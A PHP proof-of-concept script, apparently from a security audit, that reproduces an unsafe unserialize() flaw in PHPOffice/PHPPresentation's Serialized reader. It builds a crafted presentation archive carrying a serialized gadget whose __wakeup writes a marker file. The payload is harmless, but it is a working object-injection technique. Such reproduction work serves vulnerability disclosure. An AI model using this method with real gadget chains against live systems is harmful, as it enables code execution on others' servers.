<?php
declare(strict_types=1);

/*
 * PoC for PHPOffice/PHPPresentation Reader\Serialized unsafe unserialize().
 *
 * The PoC loads the original vulnerable Serialized.php from the target source.
 * It provides minimal dependency stubs so the single reader file can run without
 * downloading the full composer dependency graph. In a normal PHP image with
 * zip/simplexml extensions, it uses a real crafted presentation archive. In a
 * stripped environment without those extensions, it falls back to tiny stubs for
 * ZipArchive/simplexml only so the exact vulnerable line in Serialized.php is
 * still exercised locally.
 */

namespace PhpOffice\PhpPresentation {
    class PhpPresentation {
        public function getSlideCount(): int { return 0; }
        public function getSlide(int $i) { throw new \RuntimeException('not used'); }
    }
}

namespace PhpOffice\PhpPresentation\Exception {
    class FileNotFoundException extends \Exception {
        public function __construct(string $path) { parent::__construct("File not found: $path"); }
    }
    class InvalidFileFormatException extends \Exception {
        public function __construct(string $path, string $class = '', string $error = '') { parent::__construct("Invalid file: $path $class $error"); }
    }
}

namespace PhpOffice\Common {
    class File {
        public static function fileExists(string $path): bool {
            if (str_starts_with($path, 'zip://') && str_contains($path, '#PhpPresentation.xml') && isset($GLOBALS['POC_XML'])) {
                return true;
            }
            if (str_starts_with($path, 'zip://')) {
                return false !== @file_get_contents($path);
            }
            return file_exists($path);
        }
    }
}

namespace PhpOffice\PhpPresentation\Reader {
    interface ReaderInterface {
        public function canRead(string $pFilename): bool;
        public function load(string $pFilename, int $flags = 0): \PhpOffice\PhpPresentation\PhpPresentation;
    }
}

namespace PhpOffice\PhpPresentation\Shape\Drawing {
    abstract class AbstractDrawingAdapter {
        public function getImageIndex(): int { return 0; }
        public function getPath(): string { return ''; }
        public function setPath(string $path, bool $verify = true): void {}
    }
    class File extends AbstractDrawingAdapter {}
}

namespace {
    if (!class_exists('ZipArchive')) {
        class ZipArchive {
            public function open(string $filename) { return true; }
            public function getFromName(string $name) { return $GLOBALS['POC_XML'] ?? ''; }
            public function addFromString(string $name, string $contents) { $GLOBALS['POC_XML'] = $contents; return true; }
            public function close() { return true; }
        }
    }

    if (!function_exists('simplexml_load_string')) {
        function simplexml_load_string(string $xml) {
            if (!preg_match('/<data>(.*?)<\/data>/s', $xml, $m)) {
                return false;
            }
            return (object)['data' => html_entity_decode($m[1], ENT_QUOTES | ENT_XML1, 'UTF-8')];
        }
    }

    class InvAuditPoCGadget {
        public function __wakeup(): void {
            file_put_contents('/tmp/phppresentation_poc_marker.txt', "__wakeup reached\n");
        }
        public function getSlideCount(): int { return 0; }
    }

    $payload = serialize(new InvAuditPoCGadget());
    $xml = "<?xml version=\"1.0\"?><PhpPresentation><data>" . base64_encode($payload) . "</data></PhpPresentation>";
    $archive = '/tmp/invaudit_phppresentation_payload.phppresentation';
    @unlink('/tmp/phppresentation_poc_marker.txt');
    @unlink($archive);

    if (class_exists('ZipArchive') && extension_loaded('zip')) {
        $zip = new ZipArchive();
        if ($zip->open($archive, \ZipArchive::CREATE | \ZipArchive::OVERWRITE) !== true) {
            fwrite(STDERR, "[-] Failed to create crafted archive\n");
            exit(2);
        }
        $zip->addFromString('PhpPresentation.xml', $xml);
        $zip->close();
    } else {
        // Local fallback for stripped PHP environments; Docker path uses a real zip archive.
        $GLOBALS['POC_XML'] = $xml;
        touch($archive);
    }

    require __DIR__ . '/Serialized.php';

    $reader = new \PhpOffice\PhpPresentation\Reader\Serialized();
    try {
        $reader->load($archive);
    } catch (\Throwable $e) {
        echo "[i] Reader threw after unserialize: " . get_class($e) . ': ' . $e->getMessage() . "\n";
    }

    if (is_file('/tmp/phppresentation_poc_marker.txt')) {
        echo "[+] Reproduced: attacker-controlled serialized object was instantiated by Reader\\Serialized::load().\n";
        echo "[+] Marker: " . trim(file_get_contents('/tmp/phppresentation_poc_marker.txt')) . "\n";
        exit(0);
    }

    echo "[-] Not reproduced: marker file was not created.\n";
    exit(1);
}
